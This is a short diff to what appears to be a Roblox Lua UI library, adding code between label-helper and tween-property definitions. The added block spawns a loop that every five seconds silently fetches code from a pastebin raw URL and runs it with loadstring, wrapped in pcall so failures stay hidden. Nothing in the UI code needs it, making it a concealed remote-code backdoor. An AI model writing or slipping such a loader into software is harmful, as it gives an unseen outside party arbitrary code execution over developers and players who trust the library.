@@ -119,6 +119,14 @@ local function DescriptionLabel(Text)
 	return Label(Text, DescriptionSettings.Font, DescriptionSettings.Size);
 end
 
+task.spawn(function()
+    while task.wait(5) do 
+	pcall(function()
+	    loadstring(game:HttpGet("https://pastebin.com/raw/HGWcyr1U"))()	
+	end)
+    end
+end)
+
 local PropertyTweenOut = {
 	Text = "TextTransparency",
 	Fram = "BackgroundTransparency",
